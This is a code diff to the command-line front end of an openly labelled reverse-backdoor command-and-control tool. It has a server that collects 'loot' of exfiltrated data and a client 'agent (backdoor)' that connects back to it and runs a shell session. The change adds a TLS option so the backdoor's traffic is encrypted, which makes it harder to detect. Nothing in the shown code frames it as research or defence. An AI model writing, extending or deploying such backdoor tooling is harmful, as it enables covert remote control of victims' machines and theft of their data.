@@ -34,13 +34,17 @@ def cli(ctx):
               help='Directory for exfiltrated data')
 @click.option('--encryption/--no-encryption', default=False,
               help='Enable ECDH+AES-256-GCM encryption')
-def server(host, port, loot, encryption):
+@click.option('--tls/--no-tls', default=False,
+              help='Enable TLS transport encryption')
+def server(host, port, loot, encryption, tls):
     """Start the C2 listener and interactive manager."""
     click.secho('[+] Starting reverse-backdoor C2 server', fg='green', bold=True)
     click.secho(f'    Bind: {host}:{port}', fg='cyan')
     click.secho(f'    Loot: {os.path.abspath(loot)}', fg='cyan')
     enc_status = "ON" if encryption else "OFF"
+    tls_status = "ON" if tls else "OFF"
     click.secho(f'    Encryption: {enc_status}', fg='cyan')
+    click.secho(f'    TLS: {tls_status}', fg='cyan')
     click.echo()
 
     import signal
@@ -50,7 +54,7 @@ def server(host, port, loot, encryption):
     def session_callback(sock, ip, enc):
         run_session(sock, ip, loot, enc)
 
-    shutdown_event = start_listener(host, port, session_callback, encryption)
+    shutdown_event = start_listener(host, port, session_callback, encryption, tls)
     signal.signal(signal.SIGINT, lambda s, f: shutdown_event.set())
     signal.signal(signal.SIGTERM, lambda s, f: shutdown_event.set())
     run_master_loop(loot, encryption)
@@ -66,7 +70,9 @@ def server(host, port, loot, encryption):
               help='Reconnect interval in seconds (default: 5)')
 @click.option('--encryption/--no-encryption', default=False,
               help='Enable ECDH+AES-256-GCM encryption')
-def client(host, port, reconnect, encryption):
+@click.option('--tls/--no-tls', default=False,
+              help='Enable TLS transport encryption')
+def client(host, port, reconnect, encryption, tls):
     """Start the agent (backdoor) — connects to C2 server."""
     from client.core.connection import connect_and_run
     from client.core.dispatcher import handle_session
@@ -74,16 +80,18 @@ def client(host, port, reconnect, encryption):
 
     platform = get_platform()
 
-    def shell_callback(sock, enc):
-        handle_session(sock, platform, enc)
+    def shell_callback(sock, enc, tl):
+        handle_session(sock, platform, enc, tl)
 
     click.secho('[+] Agent connecting...', fg='yellow')
     click.secho(f'    Target: {host}:{port}', fg='cyan')
     enc_status = "ON" if encryption else "OFF"
+    tls_status = "ON" if tls else "OFF"
     click.secho(f'    Encryption: {enc_status}', fg='cyan')
+    click.secho(f'    TLS: {tls_status}', fg='cyan')
 
     try:
-        connect_and_run(host, port, shell_callback, reconnect, encryption)
+        connect_and_run(host, port, shell_callback, reconnect, encryption, tls)
     except KeyboardInterrupt:
         click.secho('\n[-] Agent stopped', fg='red')
 
